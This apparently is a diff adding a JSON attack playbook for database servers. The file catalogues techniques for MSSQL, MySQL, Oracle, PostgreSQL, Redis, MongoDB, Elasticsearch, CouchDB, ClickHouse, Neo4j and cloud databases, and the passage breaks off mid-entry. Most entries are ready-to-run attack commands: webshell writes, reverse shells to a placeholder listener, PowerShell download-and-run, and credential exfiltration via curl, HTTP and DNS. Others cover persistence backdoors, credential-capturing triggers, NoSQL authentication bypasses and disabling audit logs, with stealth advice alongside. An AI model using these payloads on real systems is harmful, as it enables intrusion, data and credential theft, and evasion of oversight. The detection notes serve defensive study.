@@ -1,0 +1,654 @@
+{
+  "mssql_enum": {
+    "description": "Enumerating Microsoft SQL Server instances and configurations.",
+    "mitre": "T1046",
+    "commands": [
+      {
+        "description": "Discover MSSQL instances via nmap.",
+        "method": "nmap",
+        "command": "nmap -p 1433 --script ms-sql-info,ms-sql-empty-password,ms-sql-config {target}"
+      },
+      {
+        "description": "Enumerate MSSQL with Metasploit.",
+        "method": "Metasploit",
+        "command": "use auxiliary/scanner/mssql/mssql_ping; set RHOSTS {target_range}; run"
+      },
+      {
+        "description": "Connect to MSSQL with Impacket.",
+        "method": "Impacket",
+        "command": "mssqlclient.py {domain}/{user}:{pass}@{target} -windows-auth"
+      },
+      {
+        "description": "Enumerate databases and tables.",
+        "method": "SQL",
+        "command": "SELECT name FROM master.dbo.sysdatabases; SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES;"
+      },
+      {
+        "description": "Enumerate linked servers.",
+        "method": "SQL",
+        "command": "SELECT name, data_source FROM sys.servers WHERE is_linked = 1;"
+      },
+      {
+        "description": "Check current user privileges.",
+        "method": "SQL",
+        "command": "SELECT SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin'), IS_SRVROLEMEMBER('db_owner');"
+      }
+    ],
+    "prerequisites": "Network access to SQL Server port 1433; valid credentials or Windows auth",
+    "opsec": "SQL enumeration via linked servers maps internal networks. sa account is commonly disabled. Try Windows auth via impacket mssqlclient.",
+    "detection_ref": "SQL Server audit log; sp_who2 for active connections; anomalous connection source IPs; failed login events"
+  },
+  "mssql_exploitation": {
+    "description": "Exploiting MSSQL features for code execution and privilege escalation.",
+    "mitre": "T1505.001",
+    "commands": [
+      {
+        "description": "Enable xp_cmdshell for OS command execution.",
+        "method": "SQL",
+        "command": "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'whoami';"
+      },
+      {
+        "description": "Steal NetNTLMv2 hash via UNC path injection.",
+        "method": "SQL",
+        "command": "EXEC xp_dirtree '\\\\{lhost}\\share';  -- Capture hash with Responder"
+      },
+      {
+        "description": "Read local files via BULK INSERT.",
+        "method": "SQL",
+        "command": "CREATE TABLE tmp_file (content NVARCHAR(MAX)); BULK INSERT tmp_file FROM 'C:\\Windows\\System32\\drivers\\etc\\hosts'; SELECT * FROM tmp_file;"
+      },
+      {
+        "description": "Write files via OLE Automation (xp_cmdshell alt).",
+        "method": "SQL",
+        "command": "EXEC sp_configure 'Ole Automation Procedures',1; RECONFIGURE; DECLARE @obj INT; EXEC sp_OACreate 'Scripting.FileSystemObject', @obj OUT; -- write file operations"
+      },
+      {
+        "description": "Impersonate another SQL login for privesc.",
+        "method": "SQL",
+        "command": "SELECT DISTINCT b.name FROM sys.server_permissions a JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'; EXECUTE AS LOGIN = 'sa'; SELECT SYSTEM_USER;"
+      },
+      {
+        "description": "Lateral movement via linked server execution.",
+        "method": "SQL",
+        "command": "SELECT * FROM OPENQUERY({linked_server}, 'SELECT SYSTEM_USER'); EXEC ('{linked_server}', 'EXEC xp_cmdshell ''whoami''') AT {linked_server};"
+      },
+      {
+        "description": "Database trustworthy escalation.",
+        "method": "SQL",
+        "command": "SELECT name, is_trustworthy_on FROM sys.databases; -- If db is TRUSTWORTHY and owned by SA:\nUSE {trusted_db}; EXEC sp_addsrvrolemember 'currentuser', 'sysadmin';"
+      }
+    ],
+    "prerequisites": "sysadmin role or xp_cmdshell-capable account; SQL Server accessible",
+    "opsec": "Enable xp_cmdshell via sp_configure \u2014 generates audit events. Use sp_OACreate as stealthier alternative. CLR assemblies require Assembly creation permission.",
+    "detection_ref": "SQL Server error log for xp_cmdshell; Event ID 15457 (sp_configure changes); Sysmon child processes of sqlservr.exe"
+  },
+  "mysql_exploitation": {
+    "description": "MySQL/MariaDB attack techniques.",
+    "mitre": "T1078",
+    "commands": [
+      {
+        "description": "Connect to MySQL remotely.",
+        "method": "mysql",
+        "command": "mysql -h {target} -u {user} -p{pass}"
+      },
+      {
+        "description": "Read local files via LOAD DATA INFILE.",
+        "method": "SQL",
+        "command": "LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE tmp_table; SELECT * FROM tmp_table;"
+      },
+      {
+        "description": "Write webshell via INTO OUTFILE.",
+        "method": "SQL",
+        "command": "SELECT '<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/shell.php';"
+      },
+      {
+        "description": "Enumerate all databases and tables.",
+        "method": "SQL",
+        "command": "SHOW DATABASES; USE {database}; SHOW TABLES; SELECT * FROM {table} LIMIT 20;"
+      },
+      {
+        "description": "Extract all user credentials.",
+        "method": "SQL",
+        "command": "SELECT user, authentication_string FROM mysql.user;"
+      },
+      {
+        "description": "Brute force MySQL with Hydra.",
+        "method": "hydra",
+        "command": "hydra -l {user} -P {wordlist} mysql://{target}"
+      }
+    ],
+    "prerequisites": "MySQL root or FILE privilege; SELECT INTO OUTFILE capability; writable web directory",
+    "opsec": "UDF (User Defined Function) for OS command execution requires dropping a DLL \u2014 detected by AV. Use MySQL Event Scheduler for persistence instead.",
+    "detection_ref": "MySQL general query log; audit plugin; anomalous UDF loading; file write events from mysqld process"
+  },
+  "oracle_exploitation": {
+    "description": "Oracle Database attack techniques.",
+    "mitre": "T1078",
+    "commands": [
+      {
+        "description": "Discover Oracle TNS listener.",
+        "method": "nmap",
+        "command": "nmap -p 1521 --script oracle-tns-version {target}"
+      },
+      {
+        "description": "Enumerate Oracle SIDs.",
+        "method": "odat",
+        "command": "python3 odat.py sidguesser -s {target}"
+      },
+      {
+        "description": "Brute force Oracle credentials.",
+        "method": "odat",
+        "command": "python3 odat.py passwordguesser -s {target} -d {sid} --accounts-file accounts.txt"
+      },
+      {
+        "description": "Execute OS commands via Java (if Java enabled).",
+        "method": "SQL",
+        "command": "EXEC dbms_java.runjava('oracle/aurora/util/Wrapper C:\\\\Windows\\\\System32\\\\cmd.exe /c whoami > C:\\\\Temp\\\\out.txt');"
+      },
+      {
+        "description": "Read files via UTL_FILE.",
+        "method": "SQL",
+        "command": "DECLARE v_file UTL_FILE.file_type; v_line VARCHAR2(4000); BEGIN v_file := UTL_FILE.fopen('{directory}','{filename}','R'); UTL_FILE.get_line(v_file, v_line); DBMS_OUTPUT.put_line(v_line); UTL_FILE.fclose(v_file); END;"
+      },
+      {
+        "description": "Privilege escalation via DBA role grant.",
+        "method": "SQL",
+        "command": "GRANT DBA TO {user}; -- requires current DBA privileges"
+      }
+    ],
+    "prerequisites": "Oracle DBA role or JAVA permissions; Oracle instance accessible",
+    "opsec": "Oracle Java stored procedures for OS command execution. DBMS_SCHEDULER for persistence. UTL_HTTP/UTL_FILE for data exfiltration.",
+    "detection_ref": "Oracle Unified Audit; anomalous DBMS_SCHEDULER job creation; Java stored procedure execution logging; privilege access monitoring"
+  },
+  "redis_exploitation": {
+    "description": "Exploiting Redis instances for code execution and data theft.",
+    "mitre": "T1190",
+    "commands": [
+      {
+        "description": "Identify unauthenticated Redis.",
+        "method": "redis-cli",
+        "command": "redis-cli -h {target} -p 6379 PING"
+      },
+      {
+        "description": "Dump all Redis keys and values.",
+        "method": "redis-cli",
+        "command": "redis-cli -h {target} KEYS '*'; redis-cli -h {target} GET {key}"
+      },
+      {
+        "description": "Write SSH authorized_keys via Redis config manipulation.",
+        "method": "redis-cli",
+        "command": "redis-cli -h {target} config set dir /root/.ssh && redis-cli -h {target} config set dbfilename authorized_keys && redis-cli -h {target} set payload \"\\n\\n{ssh_pub_key}\\n\\n\" && redis-cli -h {target} save"
+      },
+      {
+        "description": "Write cron reverse shell via Redis.",
+        "method": "redis-cli",
+        "command": "redis-cli -h {target} config set dir /var/spool/cron && redis-cli -h {target} config set dbfilename root && redis-cli -h {target} set payload \"\\n\\n* * * * * bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\\n\\n\" && redis-cli -h {target} save"
+      },
+      {
+        "description": "Load malicious module for RCE.",
+        "method": "redis-cli",
+        "command": "redis-cli -h {target} MODULE LOAD /path/to/module.so"
+      }
+    ],
+    "prerequisites": "Redis accessible without auth (common); or known AUTH password",
+    "opsec": "Redis without auth is fully exposed. Write SSH keys or cron jobs via CONFIG SET dir. Avoid modifying live data \u2014 use slave replication for data exfil.",
+    "detection_ref": "Redis auth requirement; network access restrictions (bind 127.0.0.1); rename CONFIG command; audit Redis command execution"
+  },
+  "postgresql_exploitation": {
+    "description": "PostgreSQL attack techniques including COPY TO/FROM, large object abuse, and extension loading.",
+    "commands": [
+      {
+        "description": "Connect to PostgreSQL remotely.",
+        "method": "psql",
+        "command": "psql -h {target} -U {user} -d {database} -W"
+      },
+      {
+        "description": "Read local files via COPY FROM (requires superuser).",
+        "method": "SQL",
+        "command": "CREATE TABLE tmp_read (content TEXT); COPY tmp_read FROM '/etc/passwd'; SELECT * FROM tmp_read;"
+      },
+      {
+        "description": "Write files via COPY TO (RCE if webroot writable).",
+        "method": "SQL",
+        "command": "COPY (SELECT '<?php system($_GET[\"cmd\"]); ?>') TO '/var/www/html/shell.php';"
+      },
+      {
+        "description": "Execute OS commands via PL/pgSQL and COPY (stacked).",
+        "method": "SQL",
+        "command": "COPY cmd_output FROM PROGRAM 'id';"
+      },
+      {
+        "description": "Load malicious extension for RCE.",
+        "method": "SQL",
+        "command": "CREATE OR REPLACE FUNCTION system(cstring) RETURNS integer AS '/lib/x86_64-linux-gnu/libc.so.6','system' LANGUAGE C STRICT; SELECT system('bash -c \"{rev_shell}\"');"
+      }
+    ],
+    "mitre": "T1059",
+    "prerequisites": "PostgreSQL access with SUPERUSER or pg_execute_server_program; postgres user access",
+    "opsec": "PostgreSQL COPY TO/FROM PROGRAM for OS command execution. CREATE LANGUAGE plpythonu for Python execution. Requires specific privileges.",
+    "detection_ref": "PostgreSQL audit log (pgaudit extension); pg_log monitoring; PROGRAM execution events; privilege restriction for COPY command"
+  },
+  "mongodb_exploitation": {
+    "description": "MongoDB NoSQL attack techniques \u2014 unauthenticated access, NoSQLi, and data exfil.",
+    "commands": [
+      {
+        "description": "Connect to unauthenticated MongoDB.",
+        "method": "mongosh",
+        "command": "mongosh {target}:27017"
+      },
+      {
+        "description": "List all databases in MongoDB.",
+        "method": "mongosh",
+        "command": "show dbs"
+      },
+      {
+        "description": "Dump all documents from a collection.",
+        "method": "mongosh",
+        "command": "use {database}; db.{collection}.find().pretty()"
+      },
+      {
+        "description": "NoSQL injection bypass \u2014 always-true query operator.",
+        "method": "curl",
+        "command": "curl -X POST {url}/login -d '{\"username\":{\"$ne\":null},\"password\":{\"$ne\":null}}'"
+      },
+      {
+        "description": "NoSQL injection with regex match.",
+        "method": "curl",
+        "command": "curl {url}/api/users -d '{\"username\":{\"$regex\":\".*\"},\"password\":{\"$regex\":\".*\"}}'"
+      }
+    ],
+    "mitre": "T1046",
+    "prerequisites": "MongoDB accessible; no auth or known credentials; admin database access for JS execution",
+    "opsec": "MongoDB without auth exposes all databases. $where operator executes JavaScript (deprecated in v4.4+). BSON injection for NoSQL injection.",
+    "detection_ref": "MongoDB auth enforcement; network access restriction; disable JavaScript server execution; audit log for administrative operations"
+  },
+  "db_lateral_movement": {
+    "description": "Using databases as pivot points for lateral movement within networks.",
+    "commands": [
+      {
+        "description": "MSSQL \u2014 spawn reverse shell via xp_cmdshell.",
+        "method": "SQL",
+        "command": "EXEC xp_cmdshell 'powershell -nop -c \"IEX(New-Object Net.WebClient).DownloadString(\\\"http://{lhost}/shell.ps1\\\")\"'"
+      },
+      {
+        "description": "MSSQL \u2014 use linked server chain across multiple SQL servers.",
+        "method": "SQL",
+        "command": "EXEC ('EXEC (''xp_cmdshell ''''whoami'''') AT [{server_b}]'') AT [{server_a}]"
+      },
+      {
+        "description": "MySQL \u2014 User Defined Function (UDF) for OS command execution.",
+        "method": "SQL",
+        "command": "-- Upload lib_mysqludf_sys.so then: CREATE FUNCTION sys_exec RETURNS INT SONAME 'lib_mysqludf_sys.so'; SELECT sys_exec('id > /tmp/out');"
+      },
+      {
+        "description": "PostgreSQL \u2014 reverse shell via COPY FROM PROGRAM.",
+        "method": "SQL",
+        "command": "COPY shell(output) FROM PROGRAM 'bash -c \"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\"';"
+      },
+      {
+        "description": "Redis \u2014 write to cron for reverse shell.",
+        "method": "redis-cli",
+        "command": "redis-cli -h {target} config set dir /var/spool/cron/crontabs && redis-cli -h {target} config set dbfilename root && redis-cli -h {target} set cron \"\\n* * * * * bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\\n\" && redis-cli -h {target} save"
+      }
+    ],
+    "mitre": "T1021",
+    "prerequisites": "Database with network connectivity or linked server access; credentials for multiple DB systems",
+    "opsec": "SQL Server linked servers for cross-DB lateral movement. MSSQL to MySQL via OLEDB. PostgreSQL dblink extension. Execution on linked server via OPENROWSET.",
+    "detection_ref": "Linked server configuration audit; cross-DB query monitoring; SQL audit for OPENROWSET/OPENDATASOURCE; firewall rules between DB tiers"
+  },
+  "db_credential_attacks": {
+    "description": "Brute forcing and extracting database credentials.",
+    "commands": [
+      {
+        "description": "Brute force MSSQL with Medusa.",
+        "method": "medusa",
+        "command": "medusa -h {target} -U usernames.txt -P passwords.txt -M mssql"
+      },
+      {
+        "description": "Brute force PostgreSQL with Hydra.",
+        "method": "hydra",
+        "command": "hydra -L users.txt -P passwords.txt {target} postgres"
+      },
+      {
+        "description": "Brute force MongoDB with Nmap script.",
+        "method": "nmap",
+        "command": "nmap -p 27017 --script mongodb-brute {target}"
+      },
+      {
+        "description": "Spray common credentials against MSSQL with NetExec.",
+        "method": "nxc",
+        "command": "nxc mssql {target_range} -u sa -p {password_list}"
+      },
+      {
+        "description": "Extract credential hashes from MySQL.",
+        "method": "SQL",
+        "command": "SELECT user, host, authentication_string FROM mysql.user; -- crack with hashcat -m 3200 (bcrypt) or -m 11200 (sha256)"
+      }
+    ],
+    "mitre": "T1552",
+    "prerequisites": "Access to password hash tables (mysql.user, sys.sql_logins); or credential files",
+    "opsec": "Hashes in MySQL user table use weak algorithms (MD5/SHA1) \u2014 easily crackable offline. MSSQL uses salted SHA-512 \u2014 harder but crackable.",
+    "detection_ref": "Access to credential tables logged in audit; file monitoring for .my.cnf, pg_hba.conf; password hashing algorithm enforcement"
+  },
+  "cassandra_elasticsearch": {
+    "description": "Attacking Cassandra and Elasticsearch for unauthenticated data access and exfil.",
+    "commands": [
+      {
+        "description": "Enumerate Elasticsearch indices (unauthenticated).",
+        "method": "curl",
+        "command": "curl http://{target}:9200/_cat/indices?v"
+      },
+      {
+        "description": "Dump all documents from Elasticsearch index.",
+        "method": "curl",
+        "command": "curl http://{target}:9200/{index}/_search?size=10000 | jq '.hits.hits[]._source'"
+      },
+      {
+        "description": "Check Elasticsearch cluster health and node info.",
+        "method": "curl",
+        "command": "curl http://{target}:9200/_cluster/health && curl http://{target}:9200/_nodes"
+      },
+      {
+        "description": "Connect to Cassandra and list keyspaces.",
+        "method": "cqlsh",
+        "command": "cqlsh {target} && DESCRIBE KEYSPACES; USE {keyspace}; DESCRIBE TABLES;"
+      },
+      {
+        "description": "Dump Cassandra table data.",
+        "method": "cqlsh",
+        "command": "cqlsh {target} -e 'SELECT * FROM {keyspace}.{table} LIMIT 1000;'"
+      },
+      {
+        "description": "Elasticsearch RCE via Groovy script injection (ES < 1.6).",
+        "method": "curl",
+        "command": "curl -X POST 'http://{target}:9200/_search?pretty' -d '{\"script_fields\":{\"myfield\":{\"script\":\"java.lang.Math.class.forName(\\\"java.lang.Runtime\\\").getMethod(\\\"exec\\\",\\\"java.lang.String\\\".class).invoke(java.lang.Math.class.forName(\\\"java.lang.Runtime\\\").getMethod(\\\"getRuntime\\\").invoke(null),\\\"id\\\")\"}}}'  # ES < 1.6"
+      },
+      {
+        "description": "Elasticsearch painless script injection for RCE (modern ES).",
+        "method": "curl",
+        "command": "curl -X POST 'http://{target}:9200/_search' -H 'Content-Type: application/json' -d '{\"query\":{\"match_all\":{}},\"script_fields\":{\"myfield\":{\"script\":{\"lang\":\"painless\",\"source\":\"Runtime r = Runtime.getRuntime(); Process p = r.exec(\\\"id\\\"); def b = new byte[1024]; p.getInputStream().read(b); return new String(b);\"}}}}'"
+      }
+    ],
+    "mitre": "T1046",
+    "prerequisites": "Cassandra or Elasticsearch endpoint accessible; often unauthenticated by default",
+    "opsec": "Elasticsearch without auth is frequently exposed publicly. Direct HTTP API access. Cassandra CQL interface if accessible.",
+    "detection_ref": "Authentication enforcement; network access restrictions; Elasticsearch security module; X-Pack security for cluster auth"
+  },
+  "nosql_injection": {
+    "description": "NoSQL injection attacks against MongoDB, CouchDB, and other document stores.",
+    "mitre": "T1190",
+    "commands": [
+      {
+        "description": "MongoDB NoSQL injection \u2014 operator injection via JSON body.",
+        "method": "curl",
+        "command": "curl -X POST {url}/login -H 'Content-Type: application/json' -d '{\"username\":{\"$regex\":\"admin\"},\"password\":{\"$gt\":\"\"}}'"
+      },
+      {
+        "description": "MongoDB NoSQL auth bypass \u2014 always-true query.",
+        "method": "curl",
+        "command": "curl -X POST {url}/api/login -d 'username[$ne]=x&password[$ne]=x'"
+      },
+      {
+        "description": "CouchDB admin user creation via unauthenticated API.",
+        "method": "curl",
+        "command": "curl -X PUT http://{target}:5984/_users/org.couchdb.user:hacker -H 'Content-Type: application/json' -d '{\"name\":\"hacker\",\"password\":\"hacked\",\"roles\":[\"_admin\"],\"type\":\"user\"}'"
+      },
+      {
+        "description": "CouchDB all documents dump.",
+        "method": "curl",
+        "command": "curl http://{target}:5984/{database}/_all_docs?include_docs=true"
+      },
+      {
+        "description": "MongoDB $where JavaScript injection.",
+        "method": "curl",
+        "command": "curl {url}/api/users?query={\"$where\":\"this.admin==true||'x'=='x'\"}"
+      }
+    ],
+    "prerequisites": "NoSQL database (MongoDB, CouchDB) with unsanitized input; operator injection possible",
+    "opsec": "MongoDB $where and $regex operators for data extraction. JavaScript execution via $where for code execution in older versions.",
+    "detection_ref": "Input validation; MongoDB field encryption; query parameter sanitization; SAST for NoSQL injection patterns"
+  },
+  "db_exfiltration": {
+    "description": "Exfiltrating data from databases via covert channels.",
+    "mitre": "T1048",
+    "commands": [
+      {
+        "description": "MSSQL data exfil via DNS lookup (out-of-band).",
+        "method": "SQL",
+        "command": "EXEC xp_dirtree '\\\\'+({SELECT TOP 1 username FROM users})+'.{attacker_domain}\\share'"
+      },
+      {
+        "description": "MySQL OOB exfiltration via DNS (requires FILE privilege).",
+        "method": "SQL",
+        "command": "SELECT LOAD_FILE(CONCAT('\\\\\\\\',user(),'.{attacker_domain}\\\\share'))"
+      },
+      {
+        "description": "PostgreSQL exfil via COPY TO PROGRAM.",
+        "method": "SQL",
+        "command": "COPY (SELECT usename||':'||passwd FROM pg_shadow) TO PROGRAM 'curl -d @- http://{lhost}/exfil'"
+      },
+      {
+        "description": "Oracle data exfil via UTL_HTTP.",
+        "method": "SQL",
+        "command": "DECLARE req UTL_HTTP.REQ; BEGIN req := UTL_HTTP.BEGIN_REQUEST('http://{lhost}/exfil?d='||(SELECT password FROM dba_users WHERE rownum=1)); UTL_HTTP.END_REQUEST(req); END;"
+      },
+      {
+        "description": "Extract MSSQL data in chunks via time-based covert channel.",
+        "method": "SQL",
+        "command": "IF (SELECT TOP 1 password_hash FROM users) LIKE 'a%' WAITFOR DELAY '00:00:05'  -- used for blind extraction"
+      }
+    ],
+    "prerequisites": "SELECT privileges on target tables; outbound connectivity or copy capability",
+    "opsec": "Bulk SELECT generates large read events in DB logs. Use cursor-based row-by-row extraction with delays. DNS-based exfiltration (DNS tunneling from DB host) for stealth.",
+    "detection_ref": "Database activity monitoring (DAM); anomalous large SELECT queries; data loss prevention (DLP) on DB output; DB audit triggers"
+  },
+  "db_persistence": {
+    "description": "Establishing persistence through database mechanisms.",
+    "mitre": "T1505.001",
+    "commands": [
+      {
+        "description": "MSSQL \u2014 create backdoor stored procedure that executes on any call.",
+        "method": "SQL",
+        "command": "CREATE PROCEDURE sp_helpdb_extended AS BEGIN EXEC xp_cmdshell 'powershell -nop -c {payload}'; EXEC sp_helpdb; END"
+      },
+      {
+        "description": "MySQL \u2014 CREATE EVENT for persistent scheduled task.",
+        "method": "SQL",
+        "command": "CREATE EVENT backdoor_event ON SCHEDULE EVERY 1 MINUTE DO SELECT sys_exec('bash -c \"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\"');"
+      },
+      {
+        "description": "PostgreSQL \u2014 CREATE TRIGGER on login table for credential capture.",
+        "method": "SQL",
+        "command": "CREATE OR REPLACE FUNCTION capture_creds() RETURNS TRIGGER AS $$ BEGIN COPY (SELECT NEW.username, NEW.password) TO '/tmp/creds.txt'; RETURN NEW; END; $$ LANGUAGE plpgsql; CREATE TRIGGER catch_logins AFTER INSERT ON users FOR EACH ROW EXECUTE PROCEDURE capture_creds();"
+      },
+      {
+        "description": "Oracle \u2014 DBMS_SCHEDULER job for persistence.",
+        "method": "SQL",
+        "command": "BEGIN DBMS_SCHEDULER.CREATE_JOB(job_name=>'SYSBACKUP',job_type=>'PLSQL_BLOCK',job_action=>'BEGIN DBMS_JAVA.RUNJAVA(''oracle/aurora/util/Wrapper /bin/bash -c \"{rev_shell}\"''); END;',repeat_interval=>'FREQ=MINUTELY;INTERVAL=5',enabled=>TRUE); END;"
+      },
+      {
+        "description": "Redis \u2014 WAIT for background saving and inject to startup script.",
+        "method": "redis-cli",
+        "command": "redis-cli -h {target} config set dir /etc/init.d && redis-cli -h {target} config set dbfilename rc.local && redis-cli -h {target} set backdoor '#!/bin/bash\\nbash -i >& /dev/tcp/{lhost}/{lport} 0>&1' && redis-cli -h {target} bgsave"
+      }
+    ],
+    "prerequisites": "Database admin role; ability to create stored procedures, triggers, or scheduler jobs",
+    "opsec": "Database triggers fire on DML operations \u2014 stealthy execution. Stored procedures for persistence. Scheduled jobs for regular execution.",
+    "detection_ref": "DDL change monitoring in audit log; trigger creation events; scheduled job audit; database object integrity monitoring"
+  },
+  "db_privesc_techniques": {
+    "description": "Database-specific privilege escalation beyond the basics.",
+    "mitre": "T1078",
+    "commands": [
+      {
+        "description": "MSSQL \u2014 find and abuse SERVICE account via xp_cmdshell.",
+        "method": "SQL",
+        "command": "SELECT SYSTEM_USER, CURRENT_USER, IS_SRVROLEMEMBER('sysadmin'); -- If running as NT SERVICE\\MSSQLSERVER, can pivot to SYSTEM"
+      },
+      {
+        "description": "MySQL \u2014 abuse FILE privilege to read sensitive OS files.",
+        "method": "SQL",
+        "command": "SELECT LOAD_FILE('/etc/shadow'); SELECT LOAD_FILE('/root/.ssh/id_rsa');"
+      },
+      {
+        "description": "PostgreSQL \u2014 CREATE EXTENSION for code execution (pg_execute_server_program).",
+        "method": "SQL",
+        "command": "CREATE EXTENSION adminpack; SELECT pg_read_file('/etc/passwd'); SELECT pg_execute_server_program('id')"
+      },
+      {
+        "description": "Oracle \u2014 exploit definer-rights stored procedure for privesc.",
+        "method": "SQL",
+        "command": "-- Find procedures with AUTHID DEFINER owned by DBA: SELECT owner,object_name FROM dba_procedures WHERE authid='DEFINER' AND owner IN (SELECT grantee FROM dba_sys_privs WHERE privilege='DBA')"
+      },
+      {
+        "description": "MSSQL \u2014 abuse CREATE ASSEMBLY for CLR code execution.",
+        "method": "SQL",
+        "command": "sp_configure 'clr enabled', 1; RECONFIGURE; CREATE ASSEMBLY evil FROM 0x{hex_dll_bytes} WITH PERMISSION_SET = UNSAFE; CREATE PROCEDURE execute_command(@cmd NVARCHAR(MAX)) AS EXTERNAL NAME evil.[StoredProcedures].ExecuteCommand; EXEC execute_command 'whoami'"
+      }
+    ],
+    "prerequisites": "Non-admin database user; escalation vector (stored procedure signing, schema ownership, UDF)",
+    "opsec": "Stored procedure signing with a certificate can grant sysadmin without direct role assignment (SQL Server). Schema ownership chains for privilege escalation.",
+    "detection_ref": "Database privilege audit; stored procedure signing review; schema ownership audit; certificate-based privilege escalation detection"
+  },
+  "db_audit_evasion": {
+    "description": "Evading database auditing and logging mechanisms.",
+    "mitre": "T1562",
+    "commands": [
+      {
+        "description": "MSSQL \u2014 disable SQL Server audit specification.",
+        "method": "SQL",
+        "command": "ALTER SERVER AUDIT SPECIFICATION {audit_name} WITH (STATE=OFF); ALTER SERVER AUDIT {audit_name} WITH (STATE=OFF)"
+      },
+      {
+        "description": "MySQL \u2014 disable general query log at runtime.",
+        "method": "SQL",
+        "command": "SET GLOBAL general_log = 'OFF'; SET GLOBAL slow_query_log = 'OFF';"
+      },
+      {
+        "description": "PostgreSQL \u2014 temporarily disable logging for sensitive queries.",
+        "method": "SQL",
+        "command": "SET log_statement = 'none'; SET log_min_duration_statement = -1;  -- run sensitive query then restore"
+      },
+      {
+        "description": "Oracle \u2014 disable audit trail collection.",
+        "method": "SQL",
+        "command": "NOAUDIT ALL; -- Requires AUDIT SYSTEM privilege. Also: EXECUTE DBMS_AUDIT_MGMT.CLEAR_AUDIT_TRAIL(DBMS_AUDIT_MGMT.AUDIT_TRAIL_ALL)"
+      },
+      {
+        "description": "Clear MSSQL error log to hide exploitation evidence.",
+        "method": "SQL",
+        "command": "EXEC sp_cycle_errorlog; -- Cycles error log, clearing previous entries from view"
+      }
+    ],
+    "prerequisites": "Admin access to database audit configuration; ability to modify audit settings",
+    "opsec": "Disable or suppress audit logging during sensitive operations. Use audit bypass roles if available. Minimize the number of audited commands executed.",
+    "detection_ref": "Audit configuration change monitoring; immutable audit logging (write-once storage); separate audit database; SIEM integration for DB audit events"
+  },
+  "clickhouse_neo4j_attacks": {
+    "description": "Attacking ClickHouse OLAP databases and Neo4j graph databases.",
+    "mitre": "T1190",
+    "commands": [
+      {
+        "description": "Enumerate ClickHouse databases via HTTP interface (default no auth).",
+        "method": "curl",
+        "command": "curl 'http://{target}:8123/?query=SHOW+DATABASES' && curl 'http://{target}:8123/?query=SELECT+database,+name+FROM+system.tables'"
+      },
+      {
+        "description": "Read local OS files via ClickHouse file() function.",
+        "method": "curl",
+        "command": "curl \"http://{target}:8123/?query=SELECT+file('/etc/passwd')\""
+      },
+      {
+        "description": "ClickHouse RCE via URL() function with external data injection.",
+        "method": "curl",
+        "command": "curl \"http://{target}:8123/?query=SELECT+*+FROM+url('http://{lhost}/payload.csv','CSV','x+String')\"  # SSRF and exfil via CH"
+      },
+      {
+        "description": "Neo4j unauthenticated access check and database listing.",
+        "method": "curl",
+        "command": "curl -X POST 'http://{target}:7474/db/data/cypher' -H 'Content-Type: application/json' -d '{\"query\":\"MATCH (n) RETURN n LIMIT 10\"}'"
+      },
+      {
+        "description": "Neo4j Cypher injection via application endpoint.",
+        "method": "curl",
+        "command": "curl '{url}/api/search?name=' UNION MATCH (u:User) RETURN u.password LIMIT 10 //  # If parameter unsanitized in Cypher query"
+      },
+      {
+        "description": "Neo4j RCE via apoc.load.url or LOAD CSV (if APOC plugin installed).",
+        "method": "curl",
+        "command": "curl -X POST 'http://{target}:7474/db/data/cypher' -u neo4j:{pass} -d '{\"query\":\"CALL apoc.load.url(\\\"http://{lhost}/payload.json\\\") YIELD value RETURN value\"}'"
+      }
+    ],
+    "prerequisites": "ClickHouse or Neo4j accessible; default credentials or no auth",
+    "opsec": "ClickHouse HTTP API on port 8123; native protocol on 9000. Neo4j Bolt protocol on 7687. Both frequently deployed without authentication.",
+    "detection_ref": "Authentication requirement enforcement; network access restrictions; default port exposure monitoring"
+  },
+  "cloud_managed_database_attacks": {
+    "description": "Attack cloud-managed databases \u2014 exploit RDS public snapshots, Azure SQL firewall misconfigs, and IAM database authentication.",
+    "mitre": "T1530",
+    "commands": [
+      {
+        "description": "Find publicly accessible RDS snapshots",
+        "command": "aws rds describe-db-snapshots --snapshot-type public --query 'DBSnapshots[*].[DBSnapshotIdentifier,DBInstanceIdentifier,SnapshotCreateTime]' --output table",
+        "method": "AWS CLI"
+      },
+      {
+        "description": "Restore public RDS snapshot to own account",
+        "command": "aws rds restore-db-instance-from-db-snapshot --db-instance-identifier attacker-db --db-snapshot-identifier arn:aws:rds:<region>:<victim_acct>:snapshot:<name> --publicly-accessible",
+        "method": "AWS CLI"
+      },
+      {
+        "description": "Check Azure SQL Server firewall rules for public access (0.0.0.0)",
+        "command": "az sql server firewall-rule list --server <SERVER> --resource-group <RG> --output table",
+        "method": "Azure CLI"
+      },
+      {
+        "description": "Connect to RDS using IAM authentication token",
+        "command": "TOKEN=$(aws rds generate-db-auth-token --hostname mydb.amazonaws.com --port 5432 --username iamuser)\npsql \"host=mydb.amazonaws.com dbname=mydb user=iamuser password=$TOKEN sslmode=require\"",
+        "method": "AWS CLI/psql"
+      },
+      {
+        "description": "Enumerate GCP Cloud SQL instances",
+        "command": "gcloud sql instances list\ngcloud sql instances describe <INSTANCE> --format json | python3 -m json.tool",
+        "method": "gcloud"
+      }
+    ],
+    "prerequisites": "Cloud database service access (RDS, Cloud SQL, Azure SQL); credentials or IAM permissions",
+    "opsec": "Cloud-managed databases often inherit IAM roles for auth. No OS-level access in managed DBs. Focus on data access, auth bypass, and lateral movement via creds.",
+    "detection_ref": "Cloud provider database audit logs; GuardDuty/Security Command Center database findings; network access restrictions; encryption at rest and in transit"
+  },
+  "database_credential_exfiltration": {
+    "description": "Extract credentials from database servers via hash dumping, connection string hunting in source code, and database dumps.",
+    "mitre": "T1555",
+    "commands": [
+      {
+        "description": "Dump MySQL user hashes for offline cracking",
+        "command": "mysql -u root -p -e \"SELECT User, Host, authentication_string FROM mysql.user;\"",
+        "method": "MySQL"
+      },
+      {
+        "description": "Dump PostgreSQL MD5 password hashes",
+        "command": "psql -U postgres -c \"SELECT usename, passwd FROM pg_shadow;\"",
+        "method": "PostgreSQL"
+      },
